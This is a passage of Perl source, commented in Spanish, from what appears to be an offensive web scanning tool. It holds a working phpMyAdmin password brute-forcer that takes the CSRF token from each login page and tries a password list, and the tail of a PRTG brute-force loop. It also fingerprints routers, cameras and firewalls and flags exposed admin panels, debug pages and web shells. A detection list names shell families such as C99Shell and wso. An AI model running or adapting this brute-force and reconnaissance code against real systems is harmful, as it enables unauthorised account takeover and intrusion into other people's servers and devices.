			if (!($response_headers =~ /error/m) && ! ($status =~ /500 read timeout/m)){	 
				print "Password encontrado: [PRTG] $url \nUsuario:$user Password:$password\n";
				last;
			}		
		}
		close MYINPUT;	
	}#PRTG


	if ($module eq "phpmyadmin")
	{
			
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			
			$password =~ s/\n//g; 	
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
					
			#open (SALIDA,">phpmyadmin.html") || die "ERROR: No puedo abrir el fichero google.html\n";
			#print SALIDA $decoded_response;
			#close (SALIDA);

			if ($decoded_response =~ /navigation.php/i ||  $decoded_response =~ /logout.php/i)
			{			
				print "[phpmyadmin] $url (Sistema sin password)\n";
				last;									
			}	 
			
			#name="token" value="3e011556a591f8b68267fada258b6d5a"
			$decoded_response =~ /name="token" value="(.*?)"/;
			my $token = $1;



			if ($decoded_response =~ /respondiendo|not responding|<h1>Error<\/h1>/i)
			{			
				print "ERROR: El servidor no está respondiendo \n";
				last;									
			}	 

			
			#pma_username=dgdf&pma_password=vhhg&server=1&target=index.php&token=918ab63463cf3b565d0073973b84f21c
			my $hash_data = {'pma_username' => $user, 
					'pma_password' => $password,
					'token' => $token,
					'target' => "index.php",
					'server' => "1",
					};	
		
			my $post_data = convert_hash($hash_data);
			GET:		
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$response = $self->dispatch(url => $url."index.php",method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;	
			my $status = $response->status_line;	
			my $response_headers = $response->headers_as_string;
			
			#Refresh: 0; http://181.188.172.2/phpmyadmin/index.php?token=dd92af52b6eeefd014f7254ca02b0c25
			
			
			if ($status =~ /500/m)
				{goto GET;}
				
			if ($status =~/30/m || $response_headers =~/Refresh: /m)
			{
				#Location: http://172.16.233.136/phpMyAdmin2/index.php?token=17d5777095918f70cf052a1cd769d985
				$response_headers =~ /Location:(.*?)\n/;
				my $new_url = $1; 	
				if ($new_url eq ''){
					$response_headers =~ /Refresh: 0; (.*?)\n/;
					$new_url = $1;
				}
				
				#print "new_url $new_url \n";
			
				$response = $self->dispatch(url => $new_url, method => 'GET');
				$decoded_response = $response->decoded_content;								
				#open (SALIDA,">phpmyadmin2.html") || die "ERROR: No puedo abrir el fichero google.html\n";
				#print SALIDA $decoded_response;
				#close (SALIDA);
			}
			
			print "[+] user:$user password:$password status:$status\n";
			
			#open (SALIDA,">phpmyadminn.html") || die "ERROR: No puedo abrir el fichero google.html\n";
			#print SALIDA $decoded_response;
			#close (SALIDA);
				
						
			if (!($decoded_response =~ /pma_username/m) && !($decoded_response =~ /Cannot log in to the MySQL server|Can't connect to MySQL server|1045 El servidor MySQL/i))
			{			
				print "Password encontrado: [phpmyadmin] $url Usuario:$user Password:$password\n";
				last;									
			}	
			
		}
		close MYINPUT;	
	}#phpmyadmin
}

#Extract redirect from HTML
sub getRedirect 
{
	my $decoded_response = $_[0];
	my $redirect_url = '';

	$decoded_response =~ s/; url=/;url=/gi; 
	$decoded_response =~ s/\{//gi; 
	#$decoded_response =~ s/^.*?\/noscript//s;  #delete everything before xxxxxxxxx
	$decoded_response =~ s/<noscript[^\/noscript>]*\/noscript>//g;
	
	#<meta http-equiv="Refresh" content="0;URL=/page.cgi?page=status">
	
	$decoded_response =~ /meta http-equiv="Refresh" content="0;URL=(.*?)"/i;
	$redirect_url = $1; 


	if ($redirect_url eq '')
	{
		                    #<meta http-equiv="refresh" content="1;URL="/admin""/>
		$decoded_response =~ /meta http-equiv="Refresh" content="1;URL="(.*?)"/i;
		$redirect_url = $1; 
	}

	if ($redirect_url eq '')
	{
		#<script>window.onload=function(){ url ="/webui";window.location.href=url;}</script>
		$decoded_response =~ /window.onload=function\(\) url ="(.*?)"/i;
		$redirect_url = $1; 
	}

	if ($redirect_url eq '')
	{
							#<meta http-equiv="Refresh" content="1;url=http://facturas.tigomoney.com.bo/tigoMoney/">	
		$decoded_response =~ /meta http-equiv="Refresh" content="1;URL=(.*?)"/i;
		$redirect_url = $1; 
	}


	if ($redirect_url eq '')
	{
		#<META http-equiv="Refresh" content="0;url=http://www.infocred.com.bo/BICWebSite"> 	
		$decoded_response =~ /meta http-equiv="Refresh" content="0;URL=(.*?)"/i;
		$redirect_url = $1; 
	}


	if ($redirect_url eq '')
	{
		#window.location="http://www.cadeco.org/cam";</script>	
		$decoded_response =~ /window.location="(.*?)"/i;
		$redirect_url = $1; 
	}

	if ($redirect_url eq '')
	{
		#window.location.href="login.html?ver="+fileVer;	
		$decoded_response =~ /location.href="(.*?)"/i;
		$redirect_url = $1; 
	}

	if ($redirect_url eq '')
	{
		#window.location.href = "/doc/page/login.asp?_" 	
		$decoded_response =~ /window.location.href = "(.*?)"/i;
		$redirect_url = $1; 	
	}


	if ($redirect_url eq '')
	{
		#window.location = "http://backupagenda.vivagsm.com/pdm-login-web-nuevatel-bolivia/signin/"
		$decoded_response =~ /window.location = "(.*?)"/i;
		$redirect_url = $1; 
	}

	if ($redirect_url eq '')
	{
		#top.location="/login";
		$decoded_response =~ /top.location="(.*?)"/i;
		$redirect_url = $1; 
	}

	if ($redirect_url eq '')
	{	
	#<html><script>document.location.replace("/+CSCOE+/logon.html")</script></html>
		$decoded_response =~ /location.replace\("(.*?)"/;
		$redirect_url = $1;	
	}

	if ($redirect_url eq '')
	{	
	#jumpUrl = "/cgi-bin/login.html";
		$decoded_response =~ /jumpUrl = "(.*?)"/;
		$redirect_url = $1;	
	}

	if ($redirect_url eq '')
	{	
	#top.document.location.href = "/index.html";
		$decoded_response =~ /top.document.location.href = "(.*?)"/;
		$redirect_url = $1;	
	}

	if ($redirect_url eq '')
	{	
	#<meta http-equiv="refresh" content="0.1;url=808gps/login.html"/>  
		$decoded_response =~ /http-equiv="refresh" content="0.1;url=(.*?)"/;
		$redirect_url = $1;	
	}

	if ($redirect_url eq '')
	{	
	#parent.location="login.cgi"
		$decoded_response =~ /parent.location="(.*?)"/;
		$redirect_url = $1;	
	}
	

	# si la ruta de la redireccion no esta completa borrarla
	if (($redirect_url eq 'https:' ) || ($redirect_url eq 'http:'))
		{$redirect_url=""}


	##### GO TO REDIRE URL ####
	$redirect_url =~ s/\"//g;  
	#print "redirect_url $redirect_url \n" if ($debug);

	# webfig (mikrotik) ..\/ (OWA) no usar redireccion
	if($redirect_url =~ /webfig|\.\.\//m ){
		$redirect_url="";
	#	print "mikrotik/OWA detectado \n" if ($debug);
	}
	 
	#redirect_suffix = "/redirect.html?count="+Math.random();
	if ($redirect_url eq '')
	{		
		$decoded_response =~ /redirect_suffix = "(.*?)"/;
		$redirect_url = $1;	
	}
	
	return $redirect_url;
}

sub getData
{
	my $self = shift;
	my $headers = $self->headers;
	my $debug = $self->debug;
	my $rhost = $self->rhost;
	my $rport = $self->rport;
	my $proto = $self->proto;
	my $path = $self->path;

	my $poweredBy=""; #Aqui se guarda que tipo de app es taiga/express/camara,etc
	my %options = @_;
	my $log_file = $options{ log_file };

	$headers->header("Accept-Encoding" => "gzip, deflate");
	$headers->header("TE" => "deflate,gzip;q=0.3");
	$headers->header("Connection" => "close, TE");
	$headers->header("Cache-Control" => "max-age=0");
	$headers->header("Accept" => "*/*");
	$headers->header("DNT" => "1");
	$headers->header("User-Agent" => "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36");

	my $url_original ;
	if ($rport eq '80' || $rport eq '443')
		{$url_original = "$proto://".$rhost.$path; }
	else
		{$url_original = "$proto://".$rhost.":".$rport.$path; }

	$self->browser->default_headers($headers );
    ############ 1 ###################
	my $redirect_url = 'no';#iniciamos con un valor distinto de vacio ''
	my $current_url = $url_original;
	my $final_url_redirect;
	my $response ;
	my $decoded_response;
	my $status;
	my $newdomain;
	my $last_url;
	while ($redirect_url ne '')
	{
		print "redirect_url en WHILE1 $redirect_url \n" if ($debug);
		$response = $self->browser->get($current_url);	  
		$last_url = $response->request()->uri();	
		$status = $response->status_line;

		print "last_url $last_url\n" if ($debug);
		print "url_original $url_original\n" if ($debug);	
		if ($url_original ne $last_url)
			{$poweredBy=$poweredBy."|301 Moved";}  # hubo redireccion http --> https 	
		

		############# check redireccion http --> https ############
		#Peticion original  https://186.121.202.25/
		my @url_array1 = split("/",$url_original);
		my $protocolo1 = $url_array1[0];

		#Peticion 2 (si fue redireccionada)
		my @url_array2 = split("/",$last_url);
		my $protocolo2 = $url_array2[0];
		if ($protocolo1 ne $protocolo2)
		{$poweredBy=$poweredBy."|HTTPSredirect";}  # hubo redireccion http --> https 
		#######################################

		######### Check domain redirect ######
		my $domain_original = URI->new($url_original)->host;
		my $url_final = URI->new($last_url);
		my $domain_final = $url_final->host;		
		
		print "domain_original $domain_original domain_final $domain_final \n" if ($debug);
		if ($domain_original ne $domain_final)	    
			{$poweredBy=$poweredBy."|301 Moved";$newdomain = $domain_final;}  # hubo redireccion http://dominio.com --> http://www.dominio.com o 192.168.0.1 --> dominio.com
		###########################

		$decoded_response = $response->decoded_content;
		$decoded_response =~ s/'/"/g; # convertir comilla simple en comilla doble
		$decoded_response =~ s/<noscript>.*?<\/noscript>//s;
		$decoded_response =~ s/.*\/logout.*\n//g; #eliminar la linea que contenga logout
		$decoded_response =~ s/.*sclogin.html*//g; 
		$decoded_response =~ s/.*index.html*//g; 
		$decoded_response =~ s/.*?console*//g; 
		#print($decoded_response );
		

		#obtener redirect javascrip/html
		$redirect_url = getRedirect($decoded_response);	#Obtener redireccion javascript o html
		print "redirect_url nuevo $redirect_url \n" if ($debug);
		
		my $longitud_respuesta = length($decoded_response);
		print "longitud_respuesta $longitud_respuesta \n" if ($debug);	
		if ($longitud_respuesta > 900)#si tiene esa longitud puede que tenga otra redireccion
		{
			last;
		}

		if ( $redirect_url ne ''  )
		{		
			# ruta completa http://10.0.0.1/owa
			if($redirect_url =~ /http/m ){	 		
				$final_url_redirect = $redirect_url
			} 
			else #ruta parcial /cgi-bin/login.htm	
			{
				my $firstChar = substr($redirect_url, 0, 1);
				print "firstChar $firstChar \n" if ($debug);
				#chop($redirect_url); #delete / char
				print "url_original $url_original  \n" if ($debug);
				if ($firstChar eq "/")		#/admin		
					{$final_url_redirect = $url_original.substr($redirect_url, 1);} #quitar /
				else
					{$final_url_redirect = $url_original.$redirect_url;}
			} 
			print "final_url_redirect $final_url_redirect \n" if ($debug);	
			$current_url = $final_url_redirect;
		}
		print "redirect_url en WHILE2 $redirect_url \n" if ($debug);				
	}

	
	my $response_headers = $response->headers_as_string;	
	my $decoded_header_response = $response_headers."\n".$decoded_response;	
	$decoded_response =~ s/'/"/g;
	$decoded_response =~ s/[^\x00-\x7f]//g;
	$decoded_response =~ s/\/index.php//g;
	$decoded_response =~ s/https/http/g;
	$decoded_response =~ s/www.//g;
	$decoded_response =~ s/admin\@example.com//g;
	$decoded_response =~ s/postmaster\@example.com//g;		

	open (SALIDA,">>$log_file") || die "ERROR: No puedo abrir el fichero $log_file\n";
	print SALIDA $decoded_response;
	close (SALIDA);

	my $vulnerability=checkVuln($decoded_response);
	print "vulnerability $vulnerability \n" if ($debug);	

	$poweredBy = ($decoded_header_response =~ /X-Powered-By:(.*?)\n/i);
	
	if($decoded_header_response =~ /laravel_session/m)
		{$poweredBy=$poweredBy."Laravel";} 
	
	#my $title;#) =~ /<title>(.+)<\/title>/s;
	my $title = '';
	#<title>Sudamericana Clientes</title>	
	{($title) = ($decoded_header_response =~ /<title>(.*?)<\/title>/i);}	

	if ($title eq '')
		{($title) = ($decoded_header_response =~ /<title>\s*(.*?)\s*<\/title>/s);}

	if ($title eq '')
		{($title) = ($decoded_header_response =~ /<title(.*?)\n/i);}	

	if ($title eq '')
		{($title) = ($decoded_header_response =~ /Title:(.*?)\n/i);}	

	if ($title eq '')
	{
		$decoded_header_response =~ m/>(.*?)<\/title>/;
		$title = $1; 
	}

	if ($title eq '')
	{
		$decoded_header_response =~ m/\n(.*?)\n<\/title>/;
		$title = $1; 
	}	
	

	$title =~ s/>|\n|\t|\r//g; #borrar saltos de linea
	$title = only_ascii($title);
	$title = substr($title, 0, 50);
	
	print "title $title \n" if ($debug);	

	#<meta name="geo.placename" content="Quillacollo" />
	my ($geo) = ($decoded_header_response =~ /name="geo.placename" content="(.*?)"/i);			
	$poweredBy = $poweredBy.'| geo='.$geo if (length($geo) > 1);


	#<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
	#meta name="Generator" content="Pandora 5.0" />
	my ($Generator) = ($decoded_header_response =~ /name="Generator" content="(.*?)"/i);
	
	#<meta name="Version" content="10_1_7-52331">
	my ($Version) = ($decoded_header_response =~ /name="Version" content="(.*?)"/i);
	$Generator = $Generator." ".$Version;		 
	$poweredBy = $poweredBy.'| Generator='.$Generator if (length($Generator) > 3);
   
	my ($description) = ($decoded_header_response =~ /name="description" content="(.*?)"/i);
	if ($description eq '')
		{($description) = ($decoded_header_response =~ /X-Meta-Description:(.*?)\n/i);}
	$description = only_ascii($description);				
	$poweredBy = $poweredBy.'| description='.$description if (length($description) > 1);


	#<meta name="author" content="Instituto Nacional de Estadística - Centro de Desarrollo de Redatam">
	my ($author) = ($decoded_header_response =~ /name="author" content="(.*?)"/i);
	if ($author eq '')
		{($author) = ($decoded_header_response =~ /X-Meta-Author:(.*?)\n/i);}
	$author = only_ascii($author);				
	$poweredBy = $poweredBy.'| author='.$author if (length($author) > 1);


	my ($langVersion) = ($decoded_header_response =~ /X-AspNet-Version:(.*?)\n/i);			
	$poweredBy = $poweredBy.'| langVersion='.$langVersion if (length($langVersion) > 1);

	my ($proxy) = ($response_headers =~ /Via:(.*?)\n/i);		
	$poweredBy = $poweredBy.'| proxy='.$proxy if (length($proxy) > 1);	

	my ($server) = ($response_headers =~ /Server:(.*?)\n/i);
	print "server $server \n" if ($debug);

	#WWW-Authenticate: Basic realm="Broadband Router"
	my ($Authenticate) = ($response_headers =~ /WWW-Authenticate:(.*?)\n/i);	
	$poweredBy = $poweredBy.'| proxy='.$Authenticate if (length($Authenticate) > 1);
	print "poweredBy $poweredBy \n" if ($debug);

	#jquery.js?ver=1.12.4
	my $jquery1;
	my $jquery2;
	($jquery1) = ($decoded_header_response =~ /jquery.js\?ver=(.*?)"/i);

										
	if ($jquery1 eq '')								 #jquery/1.9.1/
		{($jquery1,$jquery2) = ($decoded_header_response =~ /jquery\/(\d+).(\d+)./i);}

	if ($jquery1 eq '')								  #jquery-1.9.1.min	
		{($jquery1,$jquery2) = ($decoded_header_response =~ /jquery-(\d+).(\d+)./i);}


	print "jquery $jquery1 \n" if ($debug);	

	if ($jquery1 ne '')
		{$poweredBy = $poweredBy."| JQuery ".$jquery1.".".$jquery2;}	

	# >AssureSoft</h1>					#extraer alfanumericos + espacios
	my ($h1) = ($decoded_header_response =~ />([\w\s]+)<\/h1>/i);		
	#eliminar saltos de linea y espacios consecutivos
	$h1 =~ s/\n|\s+/ /g; $h1 = only_ascii($h1); $poweredBy = $poweredBy.'| H1='.$h1 if (length($h1) > 2);

	my ($h2) = ($decoded_header_response =~ />([\w\s]+)<\/h2>/i);		
	$h2 =~ s/\n|\s+/ /g; $h2 = only_ascii($h2); $poweredBy = $poweredBy.'| H2='.$h2 if (length($h2) > 2);

	my ($h3) = ($decoded_header_response =~ />([\w\s]+)<\/h3>/i);		
	$h3 =~ s/\n|\s+/ /g; $h3 = only_ascii($h3); $poweredBy = $poweredBy.'| H3='.$h3 if (length($h3) > 2);

	my ($h4) = ($decoded_header_response =~ />([\w\s]+)<\/h4>/i);
	$h4 =~ s/\n|\s+/ /g; $h4 = only_ascii($h4); $poweredBy = $poweredBy.'| H4='.$h4 if (length($h4) > 2);
	

	if($decoded_header_response =~ /GASOLINERA/m)
		{$poweredBy=$poweredBy."|"."GASOLINERA";} 

	if($decoded_header_response =~ /<FORM/m)
		{$poweredBy=$poweredBy."|"."formulario-login";} 	

	if($decoded_header_response =~ /2008-2017 ZTE Corporation/m)
		{$poweredBy=$poweredBy."|"."ZTE-2017";} 
	
	if($decoded_header_response =~ /2008-2018 ZTE Corporation/m)
		{$poweredBy=$poweredBy."|"."ZTE-2018";} 


	if(($decoded_header_response =~ /You have logged out of the Cisco Router/i) || ($decoded_header_response =~ /Cisco RV340 Configuration Utility/i))
		{$server="Cisco Router";} 	

	if($decoded_header_response =~ /Cisco Unified Communications/i)
		{$server="Cisco Unified Communications";} 	
	
	if($decoded_header_response =~ /CSCOE/i)
		{$server="ciscoASA";} 

	if($decoded_header_response =~ /Cisco EPN Manage/i)
		{$server="Cisco EPN Manage";} 
	

	if($decoded_header_response =~ /Boa\/0.9/i)
		{if ($title eq '') {$title="Broadband device web server";}} 	

	if($decoded_header_response =~ /OLT Web Management Interface/i)
		{$server="OLT Web Management Interface";} 

	if($decoded_header_response =~ /Janus WebRTC Server/i)
		{$server="Janus WebRTC Server";} 

	if($decoded_header_response =~ /X-OWA-Version/i)
		{$poweredBy=$poweredBy."|"."owa";} 	
		
	if($decoded_header_response =~ /AMLC COMPLIANCE/i)
		{$poweredBy=$poweredBy."|"."AMLC COMPLIANCE";} 
				
	if($decoded_header_response =~ /idrac/i)
		{$title ='Dell iDRAC';} 	
		

	if($decoded_header_response =~ /FortiGate/i)
		{$poweredBy=$poweredBy."|"."FortiGate";$server='FortiGate';} 	

	if($decoded_header_response =~ /www.drupal.org/i)
		{$poweredBy=$poweredBy."|"."drupal";} 	
	
	if($decoded_header_response =~ /laravel_session/i)
		{$poweredBy=$poweredBy."|"."laravel";} 	
		
	if($decoded_header_response =~ /wp-content|wp-admin|wp-caption/i)
		{$poweredBy=$poweredBy."|"."wordpress";} 	

	if($decoded_header_response =~ /Powered by Abrenet/i)
		{$poweredBy=$poweredBy."|"."Powered by Abrenet";} 	

	if($decoded_header_response =~ /csrfmiddlewaretoken/i)
		{$poweredBy=$poweredBy."|"."Django";} 	

	if($decoded_header_response =~ /IP Phone/i)
		{$poweredBy=$poweredBy."|"." IP Phone ";} 			

	if($decoded_header_response =~ /X-Amz-/i)
		{$poweredBy=$poweredBy."|"."amazon";} 	

	if($decoded_header_response =~ /X-Planisys-/i)
		{$poweredBy=$poweredBy."|"."Planisys";} 		

	if($decoded_header_response =~ /phpmyadmin.css/i)
		{$poweredBy=$poweredBy."|"."phpmyadmin";} 		
		
	if($decoded_header_response =~ /Set-Cookie: webvpn/i)
		{$poweredBy=$poweredBy."|"."ciscoASA";} 	
		
	if($decoded_header_response =~ /Huawei Technologies Co/i){
		$title='optical network terminal (ONT)';
		$server='Huawei';
		my ($ProductName) = ($decoded_header_response =~ /var ProductName = "(.*?)"/i);		
		$poweredBy=$poweredBy."|".$ProductName;		
		
	} 	

	if($decoded_header_response =~ /ui_huawei_fw_ver/i)
		{$server='Huawei';} 	
	
	if($decoded_header_response =~ /WVRTM-127ACN/i)
		{$poweredBy=$poweredBy."|WVRTM-127ACN";		} 	
	
	if($decoded_header_response =~ /<div id="app">/i)
		{$poweredBy=$poweredBy."|javascriptFramework";		} 	
		

	if($decoded_header_response =~ /connect.sid|X-Powered-By: Express/i)
		{$poweredBy=$poweredBy."|"."Express APP";}	

	if($decoded_header_response =~ /X-ORACLE-DMS/i)
		{$poweredBy=$poweredBy."|"."Oracle Dynamic Monitoring";}	

	if($decoded_header_response =~ /www.enterprisedb.com"><img src="images\/edblogo.png"/i)
		{$poweredBy=$poweredBy."|"."Postgres web";}	

	if($decoded_header_response =~ /src="app\//i)
		{$poweredBy=$poweredBy."|"."AngularJS";}			

	if($decoded_header_response =~ /roundcube_sessid/i)
		{$poweredBy=$poweredBy."|"."Roundcube";}	 

	if($decoded_header_response =~ /mbrico N 300Mbps WR840N/i)
		{$server="TL-WR840N";$title='Router inalámbrico N 300Mbps WR840N';}

	if((($decoded_header_response =~ /custom_logo\/web_logo.png/i) || ($decoded_header_response =~ /baseProj\/images\/favicon.ico/i) ) && ($decoded_header_response =~ /WEB SERVICE/i))
		{$server="Dahua";}			

	if($decoded_header_response =~ /webplugin.exe|BackUpBeginTimeChanged|playback_bottom_bar/i)
		{$server="Dahua";}	
	
	if($decoded_header_response =~ /pgm-theatre-staging-div/i)
		{$server="printer HP laser";}	
	
	if($decoded_header_response =~ /login\/bower_components\/requirejs\/require.js/i)
		{$server="MDS Orbit Device Manager ";}	

	if($decoded_header_response =~ /MoodleSession|content="moodle/i)
		{$poweredBy=$poweredBy."|"."moodle";}	 

	if($decoded_header_response =~ /ATEN International Co/i)
		{$server="Super micro";}		 		

	if($decoded_header_response =~ /ftnt-fortinet-grid icon-xl/i)
		{$poweredBy=$poweredBy."|"."Fortinet";$server='Fortinet';}	 			
		

	if($decoded_header_response =~ /theme-taiga.css/i)
		{$poweredBy=$poweredBy."|"."Taiga";}	 
			
	if($decoded_header_response =~ /X-Powered-By-Plesk/i)
		{$poweredBy=$poweredBy."|"."PleskWin";}	 

	if($decoded_header_response =~ /Web Services/i)	
		{$poweredBy=$poweredBy."|"."Web Service";$title="Web Service" if ($title eq "");}	

	if($decoded_header_response =~ /Acceso no autorizado/i)
		{$title="Acceso no autorizado" if ($title eq "");} 	
				
	if($decoded_header_response =~ /login__block__header/i)	
		{$poweredBy=$poweredBy."|"."login";$title="Panel de logueo" if ($title eq "");}	
				


	if($decoded_header_response =~ /Hikvision Digital/i)
		{$title="Hikvision Digital";} 			

	if($decoded_header_response =~ /szErrorTip/i)
		{$title="Hikvision Digital";} 	
		
		
	if($decoded_header_response =~ /FreeNAS/i)
		{$title="FreeNAS";} 			

	if($decoded_header_response =~ /ciscouser/i)
		{$title="Cisco switch";} 

	if($decoded_header_response =~ /pfsense-logo/i)
		{$title="Pfsense";} 

	if($decoded_header_response =~ /servletBridgeIframe/i)
		{$title="SAP Business Objects";} 	
		
	if($decoded_header_response =~ /content="Babelstar"/i)
		{$title="Body Cam";} 	
		

	if( ($decoded_header_response =~ /login to iDRAC/i) && !($decoded_response =~ /Cisco/i)  )
		{$title="Dell iDRAC";} 

	if($decoded_header_response =~ /portal.peplink.com/i)
		{$title="Web Admin PepLink";} 	

	# <h1>RouterOS v6.47.4</h1>
	if($decoded_header_response =~ /RouterOS router/i)
		{	$decoded_header_response =~ /\<h1\>(.*?)\<\/h1\>/;	
			$server=$1;} 	
	
	if($decoded_header_response =~ /Juniper Web Device Manager/i)
		{$server='Juniper Web Device Manager';}

	if($decoded_header_response =~ /by Cisco Systems, Inc/i)
		{$server='Cisco WebUI';}

	
	my %data = (            
				"title" => $title,
				"server" => $server,
				"status" => $status,
				"redirect_url" => $final_url_redirect,
				"last_url" => $last_url,				           				
				"newdomain" => $newdomain,			
				"poweredBy" => $poweredBy,
				"vulnerability" => $vulnerability
			);
			


	my $scrubber = HTML::Scrubber->new( allow => [ qw[ form input] ] ); 	
		$scrubber->rules(        
			input => {			 
				name => 1,                       
			},  
			form => {
				action => 1 ,                        
			},    
		);

	my $final_content = $scrubber->scrub($decoded_response);
			
	$self->html($final_content);
	return %data;
			
}


################################### build objects ########################

################### build headers object #####################
sub _build_headers {   
my $self = shift;
my $debug = $self->debug;
my $mostrarTodo = $self->mostrarTodo;
my $headers = HTTP::Headers->new;


my @user_agents=( "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
			  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Gecko/20100101 Firefox/23.0",
			  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
			  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36");			   
			  
my $user_agent = @user_agents[rand($#user_agents+1)];    
print "user_agent $user_agent \n" if ($debug);

$headers->header('User-Agent' => "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"); 
$headers->header('Accept' => '*/*'); 
$headers->header('Connection' => 'close'); 
$headers->header('Cache-Control' => 'max-age=0'); 
$headers->header('DNT' => '1'); 

return $headers; 
}


###################################### internal functions ###################

sub only_ascii
{
 my ($text) = @_;
 
$text =~ s/á/a/g; 
$text =~ s/é/e/g; 
$text =~ s/í/i/g; 
$text =~ s/ó/o/g; 
$text =~ s/ú/u/g;
$text =~ s/ñ/n/g; 

$text =~ s/Á/A/g; 
$text =~ s/É/E/g; 
$text =~ s/Í/I/g; 
$text =~ s/Ó/O/g; 
$text =~ s/Ú/U/g;
$text =~ s/Ñ/N/g;

$text =~ s/[^[:ascii:]]//g;
return $text;
}

sub convert_hash
{
my ($hash_data)=@_;
my $post_data ='';
foreach my $key (keys %{ $hash_data }) {    
    my $value = $hash_data->{$key};
    $post_data = $post_data.uri_escape($key)."=".$value."&";    
}	
chop($post_data);
return $post_data;
}

sub checkVuln (){
	my ($decoded_content) = @_;
	my $vuln="";

	if($decoded_content =~ /Lorem ipsum/m){	
		$vuln="contenidoPrueba";	
	}	

	if($decoded_content =~ /DEBUG = True|app\/controllers|SERVER_ADDR|REMOTE_ADDR|DOCUMENT_ROOT\/|TimeoutException|vendor\/laravel\/framework\/src\/Illuminate/){	  #APP_ENV
	
		$vuln = "debugHabilitado";
	}

	if ($decoded_content =~ / RAT |C99Shell|b374k| r57 | wso | pouya | Kacak | jsp file browser |vonloesch.de|Upload your file|Cannot execute a blank command|fileupload in/i){	 
		$vuln = "backdoor";
	}	

	if ($decoded_content =~ /db\=information_schema/i){	 
		$vuln = "OpenPhpMyAdmin";
	}		

	if ($decoded_content =~ /var user = "admin";/i){	 
		$vuln = "OpenMikrotik";
	}		
	
	# Warning: mktime() expects parameter 6 to be long, string given in C:\inetpub\vhosts\mnhn.gob.bo\httpdocs\scripts\fecha.ph
	# Fatal error: Uncaught exception 'Symfony\Component\Routing\Exception\ResourceNotFoundException'
	if($decoded_content =~ /undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information|E_WARNING/i)
		{$vuln = "MensajeError";}	
			 			
	if($decoded_content =~ /Access denied for/i)
	{
		#Access denied for user 'acanqui'@'192.168.4.20' 
		$decoded_content =~ /Access denied for user (.*?)\(/;
		my $usuario_ip = $1; 
		$vuln = "ExposicionUsuarios";
	 } 	
		
	if($decoded_content =~ /Directory of|Index of|Parent directory/)
		{$vuln = "ListadoDirectorios";} 
	
	if($decoded_content =~ /HTTP_X_FORWARDED_HOST|HTTP_X_FORWARDED_SERVER|phpinfo\(\)/i)
		{$vuln = "divulgacionInformacion";} 

	if($decoded_content =~ /Client IP:/i)
		{$vuln = "IPinterna";} 
	
	return $vuln;
}

sub dispatch {    
my $self = shift;
my $debug = $self->debug;
my %options = @_;

my $url = $options{ url };
my $method = $options{ method };
my $headers = $options{ headers };
my $response;

if ($method eq 'POST_OLD')
  {     
   my $post_data = $options{ post_data };        
   $response = $self->browser->post($url,$post_data);
  }  
    
if ($method eq 'GET')
  { my $req = HTTP::Request->new(GET => $url, $headers);
    $response = $self->browser->request($req)
  }

if ($method eq 'HEAD')
  { my $req = HTTP::Request->new(HEAD => $url, $headers, "\n\n");
    $response = $self->browser->request($req)
  }  

if ($method eq 'OPTIONS')
  { my $req = HTTP::Request->new(OPTIONS => $url, $headers);
    $response = $self->browser->request($req)
  }  
  
if ($method eq 'POST')
  {     
   my $post_data = $options{ post_data };           
   my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   $response = $self->browser->request($req);  
  }  
  
if ($method eq 'POST_MULTIPART')
  {    	   
   my $post_data = $options{ post_data }; 
   $headers->header('Content_Type' => 'multipart/form-data');
    my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   $response = $self->browser->request($req);    
  } 

if ($method eq 'POST_FILE')
  { 
	my $post_data = $options{ post_data };         	    
	$headers->header('Content_Type' => 'application/xml');
    my $req = HTTP::Request->new(POST => $url, $headers);
    $req->content($post_data);    
    $response = $self->browser->request($req);    
  }  
      
  
return $response;
}

################### build browser object #####################	
sub _build_browser {    

	my $self = shift;
	my $rhost = $self->rhost;
	my $rport = $self->rport;
	my $proto = $self->proto;

	my $debug = $self->debug;
	my $mostrarTodo = $self->mostrarTodo;
	my $proxy_host = '127.0.0.1'; #$self->proxy_host;
	my $proxy_port = 8083; $self->proxy_port;
	my $proxy_user = $self->proxy_user;
	my $proxy_pass = $self->proxy_pass;
	my $proxy_env = $self->proxy_env;
	my $timeout = $self->timeout;
	my $max_redirect = $self->max_redirect;

	print "building browser \n" if ($debug);
	print "max_redirect $max_redirect \n" if ($debug);

	
	my $browser = LWP::UserAgent->new( max_redirect => $max_redirect, env_proxy => 1,keep_alive => 1, timeout => $timeout, agent => "Mozilla/4.76 [en] (Win98; U)",ssl_opts => { verify_hostname => 0 ,  SSL_verify_mode => 0});
	$browser->cookie_jar(HTTP::Cookies->new());
	$browser->show_progress(1) if ($debug);
	
	# Configuración del proxy
	#$browser->proxy(['http', 'https'], 'http://127.0.0.1:8083');


	if ($proto eq '')
	{
		print "Detecting SSL \n" if ($debug);
		my $proto_output = `get_ssl_cert.py $rhost $rport 2>/dev/null`;
		if($proto_output =~ /CN/m)
			{$self->proto('https');print "SSL detected \n" if ($debug);}
		else
			{$self->proto('http'); print "NO SSL detected \n" if ($debug);}
	}
	return $browser;     
}
    
}
1;

